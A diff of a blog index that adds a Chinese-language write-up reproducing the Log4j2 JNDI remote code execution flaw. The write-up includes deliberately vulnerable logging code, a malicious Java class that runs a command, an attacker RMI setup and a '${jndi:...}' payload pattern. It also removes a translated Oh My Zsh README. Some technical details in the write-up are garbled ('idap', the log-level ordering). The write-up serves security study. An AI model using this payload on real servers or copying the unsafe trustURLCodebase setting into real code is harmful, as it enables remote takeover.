+<h4 id="Log4j框架"><a href="#Log4j框架" class="headerlink" title="Log4j框架"></a>Log4j框架</h4><p>Log4j是Apache软件基金会下的一个开源日志框架项目，可用于控制日志信息的传输目的地(如GUI组件、控制台、文件等)，通过定义单一的日志信息级别，开发人员和企业可以更细致地操控日志生成过程。Log4j的三个重要组件包括：输出源（Appenders）将格式化的日志消息发送到目标；日志记录器（Loggers）负责管理日志处理流程并将消息路由到适当的输出源；布局器（Layouts）则确定每条日志消息的格式。</p>
+<h4 id="Log4j2框架"><a href="#Log4j2框架" class="headerlink" title="Log4j2框架"></a>Log4j2框架</h4><p>Apache Log4j2是对Log4j日志框架的升级，较于Logback可谓是集大成之作，它修复了前架构中一些常见问题，并且比其前辈Log4j 1.X更为出色，一经面世则受到了广泛的追捧和大量的应用。Log4j2作为一种通用的日志记录工具，它可以支持基于上下文数据、标记、正则表达式和其他组件的过滤，它极强的场景兼容性使得很容易地可以融入和应用于各种场景，以帮助开发人员记录和跟踪应用程序运行时的信息.</p>
+<p>Log4j2是一个强大、灵活且高效的日志框架，在性能、功能和易用性方面都有所改进。虽然Log4j2是由Log4j升级而来，它们之间可谓是一脉相承，但是Log4j2相比于Log4j有了很多改进和新特性。例如，Log4j2支持lambda表达式、更多的日志方法、基于上下文数据、标记、正则表达式等组件的过滤器等。因此，将它们归为同一类型是合适的。而在配置方面，Log4j2对比其前身的Log4j也有所改进，它支持通过XML、JSON、YAML等多种格式的配置文件或者是通过编程方式进行配置，对开发者的十分友好且非常具有灵活性。此外，Log4j2还解决了一些Log4j中存在的问题，例如经典的死锁问题。</p>
+<p>像比于只有一个jar包<code>log4j-$&#123;version&#125;.jar</code>的Log4j。Log4j2主要分为2个jar包，其中一个是接口<code>log4j-api-$&#123;version&#125;.jar</code>，另一个则是具体实现的jar包<code>log4j-core-$&#123;version&#125;.jar</code>。</p>
+<h2 id="漏洞攻击思路整理及Log4j2依赖环境搭建"><a href="#漏洞攻击思路整理及Log4j2依赖环境搭建" class="headerlink" title="漏洞攻击思路整理及Log4j2依赖环境搭建"></a>漏洞攻击思路整理及Log4j2依赖环境搭建</h2><p>在日志框架Log4j2普遍的应用场景中，提供了丰富的功能为企业和项目提供了十分便利地管理应用程序日志的服务，它的强大、灵活且高效的特性使得其被广泛的采用，因此这对我们进行漏洞的复现提供非常多样化的操作思路。<br>以下将采取基于Java引入Log4j2相关依赖环境的方式，在代码中引入声明依赖于通过LDAP提供的URL代码库，以这种具有普适性且便于进行分析的项目场景，来进行模拟测试并复现Log4j2远程代码执行漏洞。<br>首先要在项目Maven中先引入Log4j2框架的两个核心依赖包，分别是log4j-api和log4j-core。具体操作方法是可以在Maven官方仓库中查找对应的依赖包，按照需要的版本号复制对应的引入代码，修改项目中的pom.xml代码并导入，这样就完成了初步的依赖环境的搭建，为了进行漏洞的复现，选择的版本号最好是低于2.15.0，如下图所示：<br><img src="/img/log4j2/0.png"></p>
+<p>依赖环境准备就绪后，编写一个使用Log4j2框架用于日志管理的简单项目用于测试，在Log4j2框架中提供了多种类型的日志管理，不同类型的方法也分别对应不同的级别。比如常用的error()方法和info()方法都可以用来记录日志信息，但它们记录日志信息时的输出等级略有不同。如用error()方法记录的日志信息属ERROR级别，表示系统发生错误；而使用info()方法记录的日志信息属于INFO级别，用于记录系统运行时的一般性信息，表示提供了一些信息。</p>
+<h2 id="进行对比非预期输入以检测Log4j2存在漏洞"><a href="#进行对比非预期输入以检测Log4j2存在漏洞" class="headerlink" title="进行对比非预期输入以检测Log4j2存在漏洞"></a>进行对比非预期输入以检测Log4j2存在漏洞</h2><p>当“核弹级”漏洞问世之后，大部分公开在网上的PoC都以error()和info()方法作为主要的日志注入点，而Log4j中有八个日志输出级别，这些对应的方法有哪些是可以作为攻击者的目标呢？这个问题在接下来的漏洞复现代码的分析过程中进行探究。<br>以下是用于测试的项目代码，主要以模拟采用Log4j2框架进行后端日志打印记录用户的输入，这里为了直观地看出输出内容，采用最为普遍使用地error()方法进行调用。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(Main.class);<span class="comment">//定义了一个log4j2的Logger对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);<span class="comment">//设置系统属性，让LDAP服务信任URL类型的类加载器</span></span><br><span class="line">        System.out.print(<span class="string">&quot;您好，请在此处输入你的用户名: &quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> scanner.nextLine();<span class="comment">//读取输入</span></span><br><span class="line">        logger.error(<span class="string">&quot;您输入的用户名是： &quot;</span> + username);<span class="comment">//使用log4j2的error()方法记录日志信息</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里可以很方便地引入Log4j2框架的服务，而声明了属性com.sun.jndi.ldap.object.trustURLCodebase值为 true，应用程序就可以使用JNDI来访问通过LDAP提供的远程对象时，可以信任外部的URL代码库中所提供的资源。这样的声明便给项目留下了后患无穷的安全隐患，因为恶意攻击者可以利用这个条件来执行远程代码，这部分代码可能是攻击者有意设计的恶意代码，而在服务的本地执行过程中不加以任何限制给予以信任，则可能造成严重的信息泄露或系统破坏等安全风险。<br>下图演示的是正常情况下的用户输入后Log4j2日志框架记录的结果：<br><img src="/img/log4j2/1.png"></p>
+<p>下图是模拟用户非预期输入后Log4j2日志框架记录的结果：<br><img src="/img/log4j2/2.png"></p>
+<p>根据对比可以很明显地看到当用户进行非预期输入时，Log4j2日志框架并不打印出输入的内容，而是将输入的内容作为指令在服务器端执行并返回了不应该在日志中出现的敏感信息。结果正是日志中离奇地输出了服务器的Java版本信息，说明了攻击者注入成功并执行，这个Log4j2框架的版本是存在安全漏洞的。</p>
+<h2 id="基于JNDI接口进行远程代码执行攻击"><a href="#基于JNDI接口进行远程代码执行攻击" class="headerlink" title="基于JNDI接口进行远程代码执行攻击"></a>基于JNDI接口进行远程代码执行攻击</h2><p>接下来再模拟攻击者基于JNDI接口采用搭建RMI（远程方法调用）协议的服务对漏洞进行利用，并通过漏洞触发服务端对攻击者在本地编写好的恶意代码进行远程代码执行以实现入侵、破坏、窃密等渗透行为。漏洞的简易测试环境搭建的攻击端目录结构大致如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">src</span><br><span class="line">└── main</span><br><span class="line">    ├── java</span><br><span class="line">    │   └── log4j2_attack</span><br><span class="line">    │       ├── app                // 应用程序包目录</span><br><span class="line">    │       │   └── SearchController.java     // 控制器类，处理 HTTP 请求</span><br><span class="line">    │       └── hacker             // 黑客攻击包目录</span><br><span class="line">    │           ├── HackService.java      // 用于创建、绑定一个RMI服务资源</span><br><span class="line">    │           └── HackText.java             // 用于黑客攻击的恶意代码</span><br><span class="line">    └── resources</span><br></pre></td></tr></table></figure>
+<p>根据目录就能明确漏洞测试攻击的思路，就可以进行HackService.java的代码编写，首先启用一个RMI服务并创建资源，服务就采用绑定在RMI的默认端口1099上即可，并且将一个命名为“attack”的资源绑定到这个服务上，这样就创建了一个RMI远程调用服务。<br>然后这个名为attack资源的资源则是调用攻击者提前编写好的HackText.java这个用于黑客攻击的恶意代码，这样就很容易的搭建起了一个简易的RMI服务并注册了一个名为“attack”的恶意代码资源，然后借由编写好的控制器SearchController.java这个类进行HTTP请求的处理，就可以进行对log4j2漏洞的利用对目标实现远程代码执行漏洞的注入。如下图所示：</p>
+<p><img src="/img/log4j2/3.png"></p>
+<p>根据我编写的攻击代码，成功地通过JNDI接口远程调用并执行了我放置在攻击端中编写的一个弹出Windows下的Msg消息框代码，证明了漏洞的存在并且成功被利用。示例中编写的恶意代码内容如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> log4j2_attack.hacker;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HackText</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HackText</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;msg * 您好！Log4j2远程代码执行成功！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到这只是一个简单的Msg命令执行的攻击测试，但是在实际应用场景中，漏洞恶意利用者可能必然不可能只是做一个如此简单的恶作剧，同这个“核弹级”漏洞，黑客可能能够进行更加具有社会危害性的攻击。根据能够进行任意命令的执行，攻击者则可以利用包括但不限于对目标机器下载或安装恶意软件，进行隐私或敏感数据的窃取，篡改数据等。而配合木马或者其他反向连接操作，黑客可以在服务端上建立一个TCP连接甚至进行后渗透攻击，通过连接执行任意命令将会更加得心应手，甚至可以进行进一步地提高权限以接管控制整个服务器系统。除此之外，加密勒索也是黑客们经常利用漏洞进行的操作，加密服务器上的数据随后要求赎金以解密，或者将进行泄密以威胁要求赎金。各种层出不穷的漏洞利用使得网络安全的防范需要引起所有人的重视，那么这种“核弹级”的高风险漏洞的破坏性和威胁性自然不言而喻。</p>
+<h2 id="源代码分析及漏洞溯源"><a href="#源代码分析及漏洞溯源" class="headerlink" title="源代码分析及漏洞溯源"></a>源代码分析及漏洞溯源</h2><p>总结一下前面所进行的漏洞测试项目，简单来说，就是只要打印的日志中包括IDAP或RMI协议的可执行内容形如：<code>$&#123;jndi:idap://payload&#125;</code>的代码，就有可能被触发远程代码执行。</p>
+<p>根据基于本地搭建的项目模拟环境的Log4j2漏洞测试，并且结合Log4j2文档的相关描述，我们可以得知，由于Log4j2开源日志框架默认支持解析IDAP和RMI协议，并且会通过名称从IDAP或RMI服务端获取到它对于的CLASS文件，并且通过使用ClassLoader在本地加载LDAP或RMI服务端返回来的CLASS类。这种特性就为攻击者提供了攻击途径，攻击者可以输入界面注入一个包含恶意内容的IDAP协议内容（或提供一个恶意的CLASS文件），该内容传递到服务器后端就会被log4j2通过反序列化在本地服务器端执行这段字节码，从而就能实现触发恶意代码并且加载执行，从而达到攻击的目的。</p>
+<p>经过分析相关配置文件中的代码，可以发现在Log4j2的依赖代码中，主要有两个方法可能会产生注入漏洞的发生，分别是：lookup和formatMessage。其中lookup方法主要是用来解析日志中的变量，而formatMessage方法用来格式化日志信息。</p>
+<p>通过在IDEA中下断点的方式进行调试单步执行我们前面用到的项目代码，通过跟踪代码执行过程并进行分析可以观察到，在两个方法中都会调用到MessagePatternConverter类中的pareseLookup方法，按照代码逻辑我们可以看到当config存在并且noLookups为false时，同时匹配到：${‘时，则会调用replace替换字符串。</p>
+<p>在Logger.class中当我们跟进filter()方法时发现，这里会先判断this.config.getFilter()是否为空，并且默认的config.Filter是为空的 ，所以会跳过这条if语句，进而进去后续判断level等级不为空且this.intLevel当大于或等于log等级的intLevel则会返回true。可以看到如下截图所示，当前我们项目中所使用的ERROR级别属于的intLevel值为200：</p>
+<p><img src="/img/log4j2/4.png"></p>
+<p>由此代码逻辑我们可以分析出，当上述值大于等于200时，即都可能存在触发Log4j2漏洞的安全风险。对应本文在前面所提到的问题，根据Log4j中八个日志输出级别，以ERROR级别为分界线，此级别以下的日志输出级别都可能存在漏洞被利用的风险，能够作为攻击者的目标和渗透点。</p>
+<p>经过不断一层层的翻找分析，我最终找到了位于Log4j框架依赖log4j-api-2.12.1.jar包下的目录org.apache.logging.log4j&#x2F;spi下的StandardLevel方法，此代码记录了八个日志输出的级别val值，如下图标记所示：（这里需要注意的是：val数值越大代表级别越低）</p>
+<p><img src="/img/log4j2/5.png"></p>
+<p>由源代码可以分析得出，这八个日志级别由低到高分别描述分别以下： </p>
+<ul>
+<li>OFF()：最高级，不记任何信息。</li>
+<li>FATAL()：较高级别，用来记录致命事件，即那些可能导致程序陷入致命的事件。</li>
+<li>ERROR()：用于记录错误事件信息（级别200，标识漏洞存在的分界线）。</li>
+<li>WARN()：警告事件，提醒开发人员或系统管理员注意可能的问题。</li>
+<li>INFO()：用于描述应用程序粗略的运行情况。</li>
+<li>DEBUG()：用于记录应用程序中细节层面的调试信息，以帮助开发人员进行调试。</li>
+<li>TRACE()：用于记录比DEBUG更具体的跟踪事件信息。</li>
+<li>ALL()：最低级别，即启用全部记录或自定义记录。</li>
+</ul>
+]]></content>
       <categories>
         <category>网络安全</category>
       </categories>
@@ -3094,155 +3079,6 @@
       </tags>
   </entry>
   <entry>
-    <title>README for Oh My Zsh</title>
-    <url>/2022/04/28/ohmyzsh-readme/</url>
-    <content><![CDATA[<h1 id="关于Oh-My-Zsh"><a href="#关于Oh-My-Zsh" class="headerlink" title="关于Oh My Zsh"></a>关于Oh My Zsh</h1><p>Oh My Zsh是一个开源的，社区驱动的框架，用于管理<a href="https://www.zsh.org/">您的zsh</a>配置。</p>
-<p>听起来很无聊。让我们再试一次。</p>
-<p><strong>哦，我的Zsh不会让你成为10x开发人员…但你可能会觉得自己像一个。</strong></p>
-<p>一旦安装，您的终端外壳将成为镇上的话题<em>或您的钱回来！</em>在命令提示符下每次击键时，您都将利用数百个功能强大的插件和精美的主题。陌生人会在咖啡馆里走到你面前，问你<em>：“这太神奇了！你是某种天才吗？</em></p>
-<p>最后，你将开始得到你一直觉得自己应得的那种关注。…或者，也许您将利用节省的时间更频繁地开始使用牙线。😬</p>
-<p>要了解更多信息，请访问  <a href="https://ohmyz.sh/">ohmyz.sh</a>，在Twitter上关注<a href="https://twitter.com/ohmyzsh">@ohmyzsh</a>，并在<a href="https://discord.gg/ohmyzsh">Discord</a>上加入我们。</p>
-<p><a href="https://github.com/ohmyzsh/ohmyzsh/actions?query=workflow:CI"><img src="https://github.com/ohmyzsh/ohmyzsh/workflows/CI/badge.svg" alt="词"></a>  <a href="https://twitter.com/intent/follow?screen_name=ohmyzsh"><img src="https://camo.githubusercontent.com/11a416635f3d1f03b7a97eac9d92f96b165ffe65a18199d50503e1e5f3c7b633/68747470733a2f2f696d672e736869656c64732e696f2f747769747465722f666f6c6c6f772f6f686d797a73683f6c6162656c3d466f6c6c6f772b406f686d797a7368267374796c653d666c6174" alt="关注@ohmyzsh"></a><a href="https://discord.gg/ohmyzsh"><img src="https://camo.githubusercontent.com/64e8b917c8acd4f1b4c183948adc71b474cd574e5b36882f06c13631ad57ec6f/68747470733a2f2f696d672e736869656c64732e696f2f646973636f72642f363432343936383636343037323834373436" alt="不和谐服务器"></a><a href="https://gitpod.io/#https://github.com/ohmyzsh/ohmyzsh"><img src="https://camo.githubusercontent.com/eed956a921d6c38546e378ad7ee005b423b76361eef47db35b6afb2c71c8a090/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f476974706f642d72656164792d626c75653f6c6f676f3d676974706f64" alt="Gitpod ready"></a><a href="https://huntr.dev/bounties/disclose/?utm_campaign=ohmyzsh/ohmyzsh&utm_medium=social&utm_source=github&target=https://github.com/ohmyzsh/ohmyzsh"><img src="https://camo.githubusercontent.com/30c28e8a19d49b9af85a85ca1c2911731b9659e2e8596315faf92162888f162f/68747470733a2f2f63646e2e68756e74722e6465762f68756e74725f73656375726974795f62616467655f6d6f6e6f2e737667" alt="huntr.dev"></a></p>
-<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a><a href="https://github.com/ohmyzsh/ohmyzsh#getting-started"></a>开始</h2><h3 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#prerequisites"></a>先决条件</h3><ul>
-<li>类Unix操作系统：macOS，Linux，BSD。在Windows上：WSL2是首选，但cygwin或msys也大多工作。</li>
-<li>应该安装<a href="https://www.zsh.org/">Zsh</a>（v4.3.9或更新的版本很好，但我们更喜欢5.0.8及更高版本）。如果未预安装（运行以确认），请在此处查看以下wiki说明：<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Installing-ZSH">安装ZSH</a><code>zsh --version</code></li>
-<li><code>curl</code>或应安装<code>wget</code></li>
-<li><code>git</code>应安装（建议使用 v2.4.11 或更高版本）</li>
-</ul>
-<h3 id="基本安装"><a href="#基本安装" class="headerlink" title="基本安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#basic-installation"></a>基本安装</h3><p>Oh My Zsh 是通过在终端中运行以下命令之一来安装的。您可以通过命令行安装它，也可以使用 或其他类似工具。<code>curl``wget</code></p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>命令</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>curl</strong></td>
-<td><code>sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</code></td>
-</tr>
-<tr>
-<td><strong>wget</strong></td>
-<td><code>sh -c &quot;$(wget -O- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</code></td>
-</tr>
-<tr>
-<td><strong>fetch</strong></td>
-<td><code>sh -c &quot;$(fetch -o - https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot;</code></td>
-</tr>
-</tbody></table>
-<p><em>请注意，任何以前的  <code>.zshrc</code>  都将重命名为  <code>.zshrc.pre-oh-my-zsh</code>。安装后，可以将要保留的配置移动到新的  <code>.zshrc 中</code>。</em></p>
-<h4 id="手动检查"><a href="#手动检查" class="headerlink" title="手动检查"></a><a href="https://github.com/ohmyzsh/ohmyzsh#manual-inspection"></a>手动检查</h4><p>最好从您还不知道的项目中检查安装脚本。为此，您可以先下载安装脚本，浏览它以使一切正常，然后运行它：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh</span><br><span class="line">sh install.sh</span><br></pre></td></tr></table></figure>
-
-<h2 id="使用-Oh-My-Zsh"><a href="#使用-Oh-My-Zsh" class="headerlink" title="使用 Oh My Zsh"></a><a href="https://github.com/ohmyzsh/ohmyzsh#using-oh-my-zsh"></a>使用 Oh My Zsh</h2><h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#plugins"></a>插件</h3><p>哦，我的Zsh附带了大量插件供您利用。您可以查看<a href="https://github.com/ohmyzsh/ohmyzsh/tree/master/plugins">插件</a>目录和&#x2F;或<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Plugins">wiki</a>，以查看当前可用的内容。</p>
-<h4 id="启用插件"><a href="#启用插件" class="headerlink" title="启用插件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#enabling-plugins"></a>启用插件</h4><p>一旦你发现一个（或几个）你想与Oh My Zsh一起使用的插件，你就需要在文件中启用它们。您将在目录中找到 zshrc 文件。使用您喜欢的文本编辑器打开它，您将看到一个列出要加载的所有插件的位置。<code>.zshrc``$HOME</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi ~/.zshrc</span><br></pre></td></tr></table></figure>
-
-<p>例如，这可能开始看起来像这样：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">  git</span><br><span class="line">  bundler</span><br><span class="line">  dotenv</span><br><span class="line">  macos</span><br><span class="line">  rake</span><br><span class="line">  rbenv</span><br><span class="line">  ruby</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-<p><em>请注意，插件由空格（空格，制表符，新行…）分隔。<strong>不要在</strong>它们之间使用逗号，否则它会中断。</em></p>
-<h4 id="使用插件"><a href="#使用插件" class="headerlink" title="使用插件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#using-plugins"></a>使用插件</h4><p>每个内置插件都包含一个<strong>自述文件</strong>，用于记录它。此自述文件应显示别名（如果插件添加了任何别名）以及该特定插件中包含的其他好东西。</p>
-<h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#themes"></a>主题</h3><p>我们承认这一点。在Oh My Zsh世界的早期，我们可能有点太快乐了。我们现在捆绑了一百五十多个主题。他们中的大多数在wiki上都有<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Themes">屏幕截图</a>（我们正在努力更新这个！看看他们！</p>
-<h4 id="选择主题"><a href="#选择主题" class="headerlink" title="选择主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#selecting-a-theme"></a>选择主题</h4><p><em>Robby的主题是默认主题。这不是最花哨的。这不是最简单的一个。这对他来说是正确的。</em></p>
-<p>找到要使用的主题后，您需要编辑该文件。您将在那里看到一个环境变量（全部大写），如下所示：<code>~/.zshrc</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=&quot;robbyrussell&quot;</span><br></pre></td></tr></table></figure>
-
-<p>要使用其他主题，只需更改值以匹配所需主题的名称即可。例如：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=&quot;agnoster&quot; # (this is one of the fancy ones)</span><br><span class="line"><span class="meta"># </span><span class="language-bash">see https://github.com/ohmyzsh/ohmyzsh/wiki/Themes<span class="comment">#agnoster</span></span></span><br></pre></td></tr></table></figure>
-
-<p><em>注意：许多主题需要安装  <a href="https://github.com/powerline/fonts">Powerline 字体</a> 或  <a href="https://github.com/ryanoasis/nerd-fonts">书字体</a> 才能正确呈现。没有它们，这些主题将呈现<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/FAQ#i-have-a-weird-character-in-my-prompt">奇怪的提示符号</a></em></p>
-<p>打开一个新的终端窗口，您的提示应如下所示：</p>
-<p><a href="https://cloud.githubusercontent.com/assets/2618447/6316862/70f58fb6-ba03-11e4-82c9-c083bf9a6574.png"><img src="https://cloud.githubusercontent.com/assets/2618447/6316862/70f58fb6-ba03-11e4-82c9-c083bf9a6574.png" alt="“阿格诺斯特”主题"></a></p>
-<p>如果您没有找到适合您需求的主题，请查看wiki以获取<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/External-themes">更多主题</a>。</p>
-<p>如果您感到精力充沛，每次打开新的终端窗口时，都可以让计算机为您随机选择一个。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME=&quot;random&quot; # (...please let it be pie... please be some pie..)</span><br></pre></td></tr></table></figure>
-
-<p>如果您想从自己喜欢的主题列表中选择随机主题：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME_RANDOM_CANDIDATES=(</span><br><span class="line">  &quot;robbyrussell&quot;</span><br><span class="line">  &quot;agnoster&quot;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-<p>如果您只知道自己不喜欢哪些主题，则可以将它们添加到忽略的列表中：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH_THEME_RANDOM_IGNORED=(pygmalion tjkirch_mod)</span><br></pre></td></tr></table></figure>
-
-<h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#faq"></a>常见问题</h3><p>如果您还有其他疑问或问题，可以在我们的<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/FAQ">常见问题解答</a>中找到解决方案。</p>
-<h2 id="高级主题"><a href="#高级主题" class="headerlink" title="高级主题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#advanced-topics"></a>高级主题</h2><p>如果你是那种喜欢亲自动手的人，这些部分可能会引起共鸣。</p>
-<h3 id="高级安装"><a href="#高级安装" class="headerlink" title="高级安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#advanced-installation"></a>高级安装</h3><p>某些用户可能希望手动安装 Oh My Zsh，或者更改默认路径或安装程序接受的其他设置（这些设置也记录在安装脚本的顶部）。</p>
-<h4 id="自定义目录"><a href="#自定义目录" class="headerlink" title="自定义目录"></a><a href="https://github.com/ohmyzsh/ohmyzsh#custom-directory"></a>自定义目录</h4><p>默认位置是（隐藏在您的主目录中，您可以使用<code>~/.oh-my-zsh``cd ~/.oh-my-zsh</code>)</p>
-<p>如果要使用环境变量更改安装目录，请在安装之前运行，或在安装管道结束之前对其进行设置，如下所示：<code>ZSH``export ZSH=/your/path</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ZSH=&quot;$HOME/.dotfiles/oh-my-zsh&quot; sh install.sh</span><br></pre></td></tr></table></figure>
-
-<h4 id="无人参与安装"><a href="#无人参与安装" class="headerlink" title="无人参与安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#unattended-install"></a>无人参与安装</h4><p>如果您在自动安装过程中运行 Oh My Zsh 安装脚本，则可以将标志传递给该脚本。这将具有不尝试更改默认 shell 的效果，并且在安装完成后它也不会运行。<code>--unattended``install.sh``zsh</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)&quot; &quot;&quot; --unattended</span><br></pre></td></tr></table></figure>
-
-<h4 id="从分叉存储库安装"><a href="#从分叉存储库安装" class="headerlink" title="从分叉存储库安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#installing-from-a-forked-repository"></a>从分叉存储库安装</h4><p>安装脚本还接受以下变量以允许安装不同的存储库：</p>
-<ul>
-<li><p><code>REPO</code>（默认值：）：其形式为 .如果设置此变量，安装程序将在 中查找存储库。<code>ohmyzsh/ohmyzsh``owner/repository``https://github.com/&#123;owner&#125;/&#123;repository&#125;</code></p>
-</li>
-<li><p><code>REMOTE</code>（默认值：）：这是 git 存储库克隆的完整 URL。如果要从不在 GitHub 上的分叉（GitLab、Bitbucket…）进行安装，或者要使用 SSH 而不是 HTTPS 进行克隆（），则可以使用此设置。<code>https://github.com/$&#123;REPO&#125;.git``git@github.com:user/project.git</code></p>
-<p>  <em>注意：它与设置  <code>REPO</code>  变量不兼容。此设置将优先。</em></p>
-</li>
-<li><p><code>BRANCH</code>（默认值：）：如果要在克隆存储库时更改要签出的默认分支，则可以使用此设置。这对于测试拉取请求或要使用 以外的分支可能很有用。<code>master``master</code></p>
-</li>
-</ul>
-<p>例如：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">REPO=apjanke/oh-my-zsh BRANCH=edge sh install.sh</span><br></pre></td></tr></table></figure>
-
-<h4 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a><a href="https://github.com/ohmyzsh/ohmyzsh#manual-installation"></a>手动安装</h4><h5 id="1-克隆存储库"><a href="#1-克隆存储库" class="headerlink" title="1. 克隆存储库"></a><a href="https://github.com/ohmyzsh/ohmyzsh#1-clone-the-repository-"></a>1. 克隆存储库</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/ohmyzsh/ohmyzsh.git ~/.oh-my-zsh</span><br></pre></td></tr></table></figure>
-
-<h5 id="2-可选，备份现有文件-zshrc"><a href="#2-可选，备份现有文件-zshrc" class="headerlink" title="2.可选，备份现有文件~/.zshrc"></a><a href="https://github.com/ohmyzsh/ohmyzsh#2-optionally-backup-your-existing-zshrc-file-"></a>2.<em>可选，</em>备份现有文件<code>~/.zshrc</code></h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp ~/.zshrc ~/.zshrc.orig</span><br></pre></td></tr></table></figure>
-
-<h5 id="3-创建新的-zsh-配置文件"><a href="#3-创建新的-zsh-配置文件" class="headerlink" title="3. 创建新的 zsh 配置文件"></a><a href="https://github.com/ohmyzsh/ohmyzsh#3-create-a-new-zsh-configuration-file-"></a>3. 创建新的 zsh 配置文件</h5><p>您可以通过复制我们为您包含的模板来创建新的 zsh 配置文件。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc</span><br></pre></td></tr></table></figure>
-
-<h5 id="4-更改默认外壳"><a href="#4-更改默认外壳" class="headerlink" title="4. 更改默认外壳"></a><a href="https://github.com/ohmyzsh/ohmyzsh#4-change-your-default-shell-"></a>4. 更改默认外壳</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chsh -s $(which zsh)</span><br></pre></td></tr></table></figure>
-
-<p>您必须从用户会话注销并重新登录才能看到此更改。</p>
-<h5 id="5-初始化新的-zsh-配置"><a href="#5-初始化新的-zsh-配置" class="headerlink" title="5. 初始化新的 zsh 配置"></a><a href="https://github.com/ohmyzsh/ohmyzsh#5-initialize-your-new-zsh-configuration-"></a>5. 初始化新的 zsh 配置</h5><p>打开新的终端窗口后，它应该使用Oh My Zsh的配置加载zsh。</p>
-<h3 id="安装问题"><a href="#安装问题" class="headerlink" title="安装问题"></a><a href="https://github.com/ohmyzsh/ohmyzsh#installation-problems"></a>安装问题</h3><p>如果您安装任何打嗝，以下是一些常见的修复程序。</p>
-<ul>
-<li>如果在切换到 后无法找到某些命令，则<em>可能需要</em>修改 in。<code>PATH``~/.zshrc``oh-my-zsh</code></li>
-<li>如果手动安装或更改了安装位置，请检查 中的环境变量。<code>ZSH``~/.zshrc</code></li>
-</ul>
